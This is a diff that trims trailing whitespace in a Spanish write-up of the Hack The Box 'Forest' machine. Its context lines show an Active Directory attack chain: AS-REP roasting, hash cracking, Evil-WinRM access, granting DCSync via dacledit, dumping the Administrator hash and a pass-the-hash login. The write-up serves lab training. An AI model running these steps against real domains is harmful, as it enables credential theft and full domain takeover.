@@ -548,8 +548,8 @@ samaccountname: svc-alfresco
 La ruta probable pasaba por `Exchange Windows Permissions`, por lo que se extrajo su SID:
 
 ```bash
-EWP_SID=$(jq -r '.data[] 
-  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL") 
+EWP_SID=$(jq -r '.data[]
+  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
   | .ObjectIdentifier' content/bloodhound/*groups.json)
 
 echo "$EWP_SID"
@@ -888,7 +888,7 @@ rtt min/avg/max/mdev = 48.100/48.100/48.100/0.000 ms
 10.129.34.129 (ttl -> 127): Windows
 
 [*] Lanzando escaneo completo de puertos
-[sudo] contraseña para r4mon: 
+[sudo] contraseña para r4mon:
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-26 12:24 CEST
 Initiating SYN Stealth Scan at 12:24
@@ -990,7 +990,7 @@ PORT      STATE SERVICE      VERSION
 Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
 |   Computer name: FOREST
 |   NetBIOS computer name: FOREST\x00
@@ -999,13 +999,13 @@ Host script results:
 |   FQDN: FOREST.htb.local
 |_  System time: 2026-04-26T03:32:23-07:00
 |_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m48s
-| smb2-time: 
+| smb2-time:
 |   date: 2026-04-26T10:32:24
 |_  start_date: 2026-04-26T10:24:20
-| smb2-security-mode: 
-|   3:1:1: 
+| smb2-security-mode:
+|   3:1:1:
 |_    Message signing enabled and required
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: <blank>
 |   authentication_level: user
 |   challenge_response: supported
@@ -1262,7 +1262,7 @@ El criterio de avance es claro: si LDAP anonymous bind funciona y aparecen usuar
 
  mkdir -p content/ad content/ldap content/users loot/ad
 ❯ sudo echo '10.129.34.129 forest.htb.local htb.local FOREST' | sudo tee -a /etc/hosts
-[sudo] contraseña para r4mon: 
+[sudo] contraseña para r4mon:
 10.129.34.129 forest.htb.local htb.local FOREST
 ❯ getent hosts htb.local
 10.129.34.129   forest.htb.local htb.local FOREST
@@ -2362,7 +2362,7 @@ El siguiente paso único es confirmar candidatos ASREPRoasting y, si existen, so
 # LDAPv3
 # base <dc=htb,dc=local> with scope subtree
 # filter: (&(objectCategory=person)(objectClass=user))
-# requesting: sAMAccountName userPrincipalName userAccountControl memberOf description servicePrincipalName 
+# requesting: sAMAccountName userPrincipalName userAccountControl memberOf description servicePrincipalName
 #
 
 # Guest, Users, htb.local
@@ -2544,7 +2544,7 @@ userAccountControl: 66048
 sAMAccountName: HealthMailbox0659cc1
 userPrincipalName: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local
 
-# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
+# Sebastien Caron, Exchange Administrators, Information Technology, Employees,
  htb.local
 dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
  =Employees,DC=htb,DC=local
@@ -2637,7 +2637,7 @@ SM_ca8c2ed5bdab4dc9b
 # LDAPv3
 # base <dc=htb,dc=local> with scope subtree
 # filter: (sAMAccountName=svc-alfresco)
-# requesting: * 
+# requesting: *
 #
 
 # search reference
@@ -2669,7 +2669,7 @@ grep: content/ldap/asrep_candidates.ldif: No existe el fichero o el directorio
   -usersfile content/users/asrep_candidates.txt \
   -no-pass \
   -outputfile loot/ad/asrep_hashes.txt
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ❯ cat content/users/asrep_candidates.txt
 ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
@@ -2883,7 +2883,7 @@ svc-alfresco
   -usersfile content/users/asrep_candidates.txt \
   -no-pass \
   -outputfile loot/ad/asrep_hashes.txt
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:f6141a645e4d299569ee170fa325d27a$485d6a64b1c4326244ca5ec707892022a1471570d02a8012360b22da60e7e7eb85a5c67b8b406240b9db4a565b1bda5e2e3cc43bb2fdb5d10755dff78e6efa615340919ce5447a607fb94b12c554d3dfbe31c8f4a728a5d5cb7da9c9cf3638a999664b5984feed2c04215231628cda83ef1fbd3cfbccbec5d6cde45464a3ac3d739c4d2a6975ac2e1a85ccbbd5204f12bc82528eaf3733b015335c8ae487d29f4c7ff9e5483f9f0be6874f19888bd78d3a180d62da487af5b6f748c51bab6119033dd32583d83dc230c2c1fb7d9506b11d5f47f3de3aeee4802c8832716ebf970564ad646490
 ❯ cat loot/ad/asrep_hashes.txt
@@ -3048,19 +3048,19 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
 Will run 8 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
 1g 0:00:00:05 DONE (2026-04-29 13:44) 0.1996g/s 815520p/s 815520c/s 815520C/s s521379846..s3r2s1
 Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
+Session completed.
 ❯ john --show loot/ad/asrep_hashes.txt | tee loot/ad/asrep_cracked.txt
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:s3rvice
 
 1 password hash cracked, 0 left
 ❯ netexec smb 10.129.95.210 -u svc-alfresco -p 's3rvice'
 SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice
 ❯ netexec winrm 10.129.95.210 -u svc-alfresco -p 's3rvice'
-WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
+WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
 WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
 
 ## Conclusiones
@@ -3237,13 +3237,13 @@ El siguiente paso único es entrar por Evil-WinRM y ejecutar la verificación m�
 
 ❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
 ❯ evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
-                                        
+
 Evil-WinRM shell v3.5
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
 htb\svc-alfresco
@@ -3834,8 +3834,8 @@ jq '.data[] | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL")' \
 
 Ver solo campos básicos de svc-alfresco:
 
-jq -r '.data[] 
-  | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL") 
+jq -r '.data[]
+  | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL")
   | {
       name: .Properties.name,
       distinguishedname: .Properties.distinguishedname,
@@ -4027,8 +4027,8 @@ REMOTE MANAGEMENT USERS@HTB.LOCAL
   "IsDeleted": false,
   "IsACLProtected": true
 }
-❯ jq -r '.data[] 
-  | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL") 
+❯ jq -r '.data[]
+  | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL")
   | {
       name: .Properties.name,
       distinguishedname: .Properties.distinguishedname,
@@ -4163,8 +4163,8 @@ jq -r '.data[] | [.ObjectIdentifier, .Properties.name] | @tsv' \
 
 Obtener el SID de Exchange Windows Permissions:
 
-EWP_SID=$(jq -r '.data[] 
-  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL") 
+EWP_SID=$(jq -r '.data[]
+  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
   | .ObjectIdentifier' content/bloodhound/*groups.json)
 
 echo "$EWP_SID"
@@ -4185,8 +4185,8 @@ WriteDacl
 
 Para ver el objeto del dominio de forma más amplia:
 
-jq '.data[] 
-  | select(.Properties.name=="HTB.LOCAL") 
+jq '.data[]
+  | select(.Properties.name=="HTB.LOCAL")
   | {
       name: .Properties.name,
       domain: .Properties.domain,
@@ -4197,8 +4197,8 @@ jq '.data[]
 
 Para comprobar el objeto del grupo Exchange Windows Permissions:
 
-jq '.data[] 
-  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL") 
+jq '.data[]
+  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
   | {
       name: .Properties.name,
       distinguishedname: .Properties.distinguishedname,
@@ -4253,8 +4253,8 @@ El siguiente paso único es comprobar WriteDacl sobre el dominio.
 ❯ jq -r '.data[] | [.ObjectIdentifier, .Properties.name] | @tsv' \
   content/bloodhound/*users.json content/bloodhound/*groups.json content/bloodhound/*domains.json \
   > content/bloodhound/id_name_map.tsv
-❯ EWP_SID=$(jq -r '.data[] 
-  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL") 
+❯ EWP_SID=$(jq -r '.data[]
+  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
   | .ObjectIdentifier' content/bloodhound/*groups.json)
 
 echo "$EWP_SID"
@@ -4268,8 +4268,8 @@ S-1-5-21-3072663084-364016917-1341370565-1121
 ' content/bloodhound/*domains.json
 WriteDacl	Group	false
 WriteDacl	Group	false
-❯ jq '.data[] 
-  | select(.Properties.name=="HTB.LOCAL") 
+❯ jq '.data[]
+  | select(.Properties.name=="HTB.LOCAL")
   | {
       name: .Properties.name,
       domain: .Properties.domain,
@@ -4387,8 +4387,8 @@ WriteDacl	Group	false
     }
   ]
 }
-❯ jq '.data[] 
-  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL") 
+❯ jq '.data[]
+  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
   | {
       name: .Properties.name,
       distinguishedname: .Properties.distinguishedname,
@@ -4567,13 +4567,13 @@ Nota: hacemos la password más corta por que nos exige 14 caracteres y no es nec
 
 ❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
 ❯ evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
-                                        
+
 Evil-WinRM shell v3.5
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user r4mforest R4mForest!26 /add /domain
 The command completed successfully.
@@ -4926,7 +4926,7 @@ impacket-dacledit: aliased to dacledit.py
   -target-dn 'DC=htb,DC=local' \
   'htb.local/r4mforest:R4mForest!26' \
   -dc-ip 10.129.95.210
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] DACL backed up to dacledit-20260429-175029.bak
 [*] DACL modified successfully!
@@ -4934,7 +4934,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
   'htb.local/r4mforest:R4mForest!26@10.129.95.210' \
   -just-dc-user Administrator \
   -outputfile loot/ad/secretsdump_administrator
-Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
@@ -5080,13 +5080,13 @@ El siguiente paso único es entrar por Evil-WinRM con el hash de Administrator.
 
 ❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
 ❯ evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
-                                        
+
 Evil-WinRM shell v3.5
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 htb\administrator
